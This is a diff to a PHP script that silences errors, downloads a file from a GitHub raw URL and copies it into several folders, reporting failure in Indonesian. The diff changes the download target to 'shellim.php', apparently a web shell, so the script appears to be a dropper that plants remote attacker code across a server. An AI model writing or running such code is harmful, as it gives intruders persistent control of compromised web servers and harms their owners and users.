@@ -4,7 +4,7 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/im';
+$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/shellim.php';
 
 function fetch_from_url($url) {
     if (function_exists('curl_init')) {
@@ -106,4 +106,5 @@ if ($successCount > 0) {
 } else {
     echo "❌ Gagal menyalin ke folder manapun.<br>\n";
 }
+
 ?>
